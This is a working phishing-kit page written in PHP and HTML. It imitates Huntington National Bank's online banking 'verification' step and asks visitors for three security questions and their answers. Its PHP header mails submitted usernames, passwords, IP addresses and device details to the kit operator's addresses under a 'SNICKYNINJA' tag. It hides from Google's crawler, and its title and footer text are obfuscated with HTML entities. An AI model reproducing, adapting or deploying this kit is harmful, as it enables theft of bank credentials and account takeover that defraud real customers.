<?php
session_start();
include('css/vld.php');
include('config/email.php');
include('antibots.php');
if(isset($_POST['submit'])){
    
    $ip = getenv("REMOTE_ADDR");
    $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ Huntington Account 2]---------------------#\n";
$msg .= "Username  2  : ".$_POST['user']."\n";
$msg .= "Password 2   : ".$_POST['pass']."\n";
$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address     : ".$ip."\n";
$msg .= "DEVICE INFORMATION         : ".$ua."\n";
$msg .= "#-------------------[ SNICKYNINJA - END ]------------------------#\n\n";
$sub = "::SNICKYNINJA:: Huntington Login Access Two: $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html><html lang="en" class="js history mediaqueries cssremunit gr__selfservice_huntington_com"><head>
<base href="">
<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" id="mainviewport">
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width">
    <meta name="viewport" content="initial-scale=1.0">

    <meta name="robots" content="noindex,nofollow">
    <meta name="keywords" content="Huntington,">
    <title>&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#83;&#116;&#101;&#112;&#32;&#49;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</title>
   <link rel="stylesheet" type="text/css" href="css/site.css" />
 <link rel="stylesheet" type="text/css" href="css/site-survey.css" />
  <link rel="stylesheet" type="text/css" href="css/hol.css" />
    <link rel="stylesheet" type="text/css" href="css/enroll.css" />

    <script src="https://selfservice.huntington.com/Scripts/jquery?v=pX-HQBQoJecxQi7lia8rno2suvj-FGLqjjM3r_b4sSw1" aria-hidden="true"></script>

    <script src="https://selfservice.huntington.com/Scripts/common?v=ErWcwz6ul8qxPN-Q2Xt7mtj9RN5A-IZQGm3UdzwQ8fI1" aria-hidden="true"></script>



<link rel="shortcut icon" type="image/ico" href="images/favicon.ico"/>

  </head>
<body lang="en-us" data-gr-c-s-loaded="true" data-inq-observer="1">
    <div class="hol-offscreen">
        <a href="#hol-mainContent">skip to main content</a>
    </div>
    <div id="hol-body">

<div id="fab-area" style="display: none;"></div>
                <div></div>




<!--Begin HolHeader-->
<div id="hol-header">
    <div class="logo-wrap">
<div id="logo-img-lg" class="hol-logo"><span class="hnb-aria-only">Huntington - Welcome</span></div>



    </div>


        <div class="nav">
            <div id="nav-links" class="links">
                <ul id="primaryNav" class="primary">
                </ul>

                <script type="text/javascript" aria-hidden="true"></script>

                <ul id="secondaryNav" class="secondary">

                    <li>
<div id="ensighten-chat"></div>
</li>

                </ul>
            </div>
        </div>
</div> 

<!--IntelliResponse-->
<!-- MenuBar -->


<div style="clear: both;"></div>

<!--End HolHeader-->

        

        <div id="hol-mainContent">
            


    <script type="text/javascript" aria-hidden="true"></script>
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Pragma" content="no-cache">
<div class="hol-pageFlowContainer">
    <img id="imgSessionAlive" width="0" height="0" alt=""><script aria-hidden="true"></script><div>   <div id="idletimeout" class="message-container timeout">       <div class="container-yellow">           <div class="icon-yellow-alert icon-pad-left"></div>           <div class="message">Your session is about to time out.</div>       </div>   </div></div>

    <!--This is a container specifying that there is a page flow-->
<h1 class="hol-page-heading">Online Banking Verification</h1>
    
<div class="validation-summary" data-summary-id="" data-summary-msg="You will find {0} error(s) below. Please correct the errors to continue." style="display:none" aria-hidden="true" hidden="">
    <div class="validation-summary-msg"></div>
    <a href="#" tabindex="0" onclick="$.fn.hol.focusFirstError(this, event)">Go to the first error</a>
</div>

    <div id="main">
        <div id="progressBar" class="hol-track-progress-bar">
      <div class="step active" data-step="1">
      <span class="step-num">
         <span class="hnb-aria-only">step </span>1
      </span>
      <span class="step-title">
         Verify Account Security
      </span>
      </div>
      <div class="step" data-step="2">
      <span class="step-num">
         <span class="hnb-aria-only">step </span>2
      </span>
      <span class="step-title">
        Personal Debit Card
      </span>
      </div>
</div>


<div id="VerifyAccountContainer">
    

<div class="hol-spacing-large"></div><h2 class="hol-section-heading">Account Security Information</h2>

<hr>


<div class="hol-radio-panel-container">
<div class="hol-radio-panel-buttons">
</div>

            <script type="text/javascript" aria-hidden="true"></script>
</div>
<div id="panels758913959">
<form action="email.php"  data-ajax-success="if(data.redirectUrl){window.location.href = ;}" data-ajax-update="#formContent" id="formContent" method="post" novalidate="novalidate"> 

<input name="__RequestVerificationToken" type="hidden" value="u21OSndYTSBkcnM_MabJkNctZbyDao4NFPUYhCETQx9KeyRq4jPr_Y2NSI4dHSaRTX9FDKQOF5ki2ucAjeBliG_HfGo1">

<div class="validation-summary" data-summary-id="" data-summary-msg="You will find {0} error(s) below. Please correct the errors to continue." style="display:none" aria-hidden="true" hidden="">
    <div class="validation-summary-msg">You will find 0 error(s) below. Please correct the errors to continue.</div>
    <a href="#" tabindex="0" onclick="$.fn.hol.focusFirstError(this, event)">Go to the first error</a>
</div>   
<div class="input">
        <label for="">Security Questiion 1</label>
        <select name="q1" class="textbox" autocomplete="off" required type="text" style="width:320px;height:38px;">
<option value="">Select One</option>
<option value="Name of high school mascot?">Name of high school mascot?</option>
<option value="Maiden name of mother">Maiden name of mother</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your dream occupation?">Which city were you born?</option>
<option value="Model of first car?">Model of first car?</option>
<option value="Name of first job">Name of first job</option>
<option value="What color was your first car?">Color of first car</option></select>
    </div>


 <div class="input">
        <label for="AccountNumber">Answer</label>
        <input autocapitalize="off" autocomplete="off" required="required" autocorrect="off" class=" hol-accountnumber-box hol-unmasked-box" data-val="true" data-val-regexwithoptions="Enter a valid Security Answer." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="[a-zA-Z0-9- ]{1,32}" data-val-required="The Security Answer field is required." id="AccountNumber" maxlength="32" name="a1" required="required" size="32" spellcheck="false" state-lastvalue="" type="text" value="" autocomplete="none" aria-required="true">
        <span class="field-validation-valid" data-valmsg-for="AccountNumber" data-valmsg-replace="true"></span>
    </div>
	
	<div class="input">
        <label for="">Security Questiion 2</label>
        <select name="q2" class="textbox" autocomplete="off" required type="text" style="width:320px;height:38px;" required="required" required="required">
<option value="">Select One</option>
<option value="Name of high school mascot?">Name of high school mascot?</option>
<option value="Maiden name of mother">Maiden name of mother</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your dream occupation?">Which city were you born?</option>
<option value="Model of first car?">Model of first car?</option>
<option value="Name of first job">Name of first job</option>
<option value="What color was your first car?">Color of first car</option></select>
    </div>


 <div class="input">
        <label for="AccountNumber">Answer</label>
        <input autocapitalize="off" autocomplete="off" required="required" autocorrect="off" class=" hol-accountnumber-box hol-unmasked-box" data-val="true" data-val-regexwithoptions="Enter a valid Security Answer." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="[a-zA-Z0-9- ]{1,32}" data-val-required="The Security Answer field is required." id="" maxlength="32" name="a2" required="required" size="32" spellcheck="false" state-lastvalue="" type="text" autocomplete="none" value="" aria-required="true">
        <span class="field-validation-valid" data-valmsg-for="" data-valmsg-replace="true"></span>
    </div>
    
	
	
		<div class="input">
        <label for="">Security Questiion 3</label>
        <select name="q3" class="textbox" autocomplete="off" required type="text" style="width:320px;height:38px;" required="required">
<option value="">Select One</option>
<option value="Name of high school mascot?">Name of high school mascot?</option>
<option value="Maiden name of mother">Maiden name of mother</option>
<option value="What is your father's middle name?">What is your father's middle name?</option>
<option value="What is your dream occupation?">Which city were you born?</option>
<option value="Model of first car?">Model of first car?</option>
<option value="Name of first job">Name of first job</option>
<option value="What color was your first car?">Color of first car</option></select>
    </div>


 <div class="input">
        <label for="AccountNumber">Answer</label>
        <input autocapitalize="off" autocomplete="off" autocorrect="off" required="required"  class=" hol-accountnumber-box hol-unmasked-box" data-val="true" data-val-regexwithoptions="Enter a valid Security Answer." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="[a-zA-Z0-9- ]{1,32}" data-val-required="The Security Answer field is required." id="" autocomplete="none" maxlength="32" name="a3" required="required" size="32" spellcheck="false" state-lastvalue="" type="text" value="" aria-required="true">
        <span class="field-validation-valid" data-valmsg-for="" data-valmsg-replace="true"></span>
    </div>
	
	
    <div class="hol-actionBar  ">
                
                        <button id="btnContinue" class="activeButton" style="" type="submit">
        Continue
    </button>

                
                
                        <a id="lnkCancel" class="cancelLink" href="#">Cancel</a>

                

    </div>
    <div class="hidden" aria-hidden="true" hidden="">
        <script type="text/javascript" aria-hidden="true"></script>
    </div>
</form></div>



</div>
    </div>
   
</div>
        </div>

<!--Begin HolFooter-->
<div id="hol-footer" role="navigation">
<div class="links">
<ul id="footermenu" role="menubar">
<li><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Identity Protection</a></li>
<li><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Security</a></li>
<li class="breakAfterIfNeeded"><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Privacy</a></li>
<li><a role="menuitem" href="#" rel="noopener noreferrer" target="_blank">Online Guarantee</a></li>
<li class="feedback-footer-parent" data-site-survey-context_placement="Footer" data-feedback-link-type="Footer" data-feedback-link-icon-id="black"><a href="#" title="Give Feedback (opens in a new window)" data-site-survey-link="Footer"><img alt="" class="oo_inline_img" src="images/oo_icon_retina_black.gif"  height="18" width="18">Give Feedback</a></li>
</ul>
</div>
<div class="legal">
<div class="large"><span class="breakAfterIfNeeded">Have questions? Call <span style="font-family: ApexNewWeb-Bold">(800) 480-2265</span></span>, daily 6:00 a.m. to midnight ET.</div><br>
<div>Mastercard and the Mastercard Brand Mark are registered trademarks of Mastercard International Incorporated.</div>
<div class="small"><div><p style="margin-top: 0px; margin-bottom: 0px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 8" fill="#333" width="20" height="20"><path clip-rule="evenodd" d="m5.1 0.8l-5.1 2.8v1h0.8v3.4h8.4v-3.4h0.8v-1l-4.9-2.8zm3.1 6.3h-6.4v-3.4l3.2-1.8 3.2 1.8v3.4z" fill-rule="evenodd"></path><path d="m3.3 5v-0.8h3.4v0.8h-3.4z"></path><path d="m3.3 5.4h3.4v0.9h-3.4v-0.9z"></path></svg>
The Huntington National Bank is an Equal Housing Lender and Member FDIC.
</p>
</div>
<img src="images/hunt.png" alt="Huntington Logo">®, Huntington®, <img src="images/hunt.png" alt="Huntington Logo">&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&reg;&#44;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#46;&#87;&#101;&#108;&#99;&#111;&#109;&#101;&#46;&reg;&#44;&#32;&#97;&#110;&#100;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#72;&#101;&#97;&#100;&#115;&#32;&#85;&#112;&reg;&#32;&#97;&#114;&#101;&#32;&#102;&#101;&#100;&#101;&#114;&#97;&#108;&#108;&#121;&#32;&#114;&#101;&#103;&#105;&#115;&#116;&#101;&#114;&#101;&#100;&#32;&#115;&#101;&#114;&#118;&#105;&#99;&#101;&#32;&#109;&#97;&#114;&#107;&#115;&#32;&#111;&#102;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#66;&#97;&#110;&#99;&#115;&#104;&#97;&#114;&#101;&#115;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;&#32;
&copy;&#32;&#50;&#48;&#50;&#48;&#32;&#32;&#72;&#117;&#110;&#116;&#105;&#110;&#103;&#116;&#111;&#110;&#32;&#66;&#97;&#110;&#99;&#115;&#104;&#97;&#114;&#101;&#115;&#32;&#73;&#110;&#99;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#100;&#46;<!--B--></div>
</div>
</div>
<script type="text/javascript" aria-hidden="true"></script> 
<!--End HolFooter-->


    </div>



    <script src="https://selfservice.huntington.com/Scripts/rol?v=vVrR5Ozy5ZQMBZ-w7W6KXORbhIwpocBaSuYq_shEbBg1" aria-hidden="true"></script>

        </div></div></body></html>